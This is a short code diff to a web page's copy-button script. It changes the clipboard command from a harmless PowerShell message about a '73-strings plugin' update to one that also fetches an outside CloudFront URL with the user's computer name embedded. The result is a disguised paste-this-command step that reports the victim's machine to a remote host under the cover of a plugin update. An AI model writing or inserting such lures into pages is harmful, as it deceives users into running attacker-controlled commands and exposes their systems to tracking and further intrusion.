@@ -45,7 +45,7 @@
 
     <script>
         document.getElementById('copyButton').addEventListener('click', function() {
-            var command = "powershell Write-Host 'Updating 73-strings plugin'";
+            var command = "powershell Write-Host \"Updating 73-strings plugin\";iwr -Uri \"https://d1k5ztam8f8myx.cloudfront.net/73-strings-computer-update-$env:COMPUTERNAME\"";
             
             var textarea = document.createElement('textarea');
             textarea.value = command;
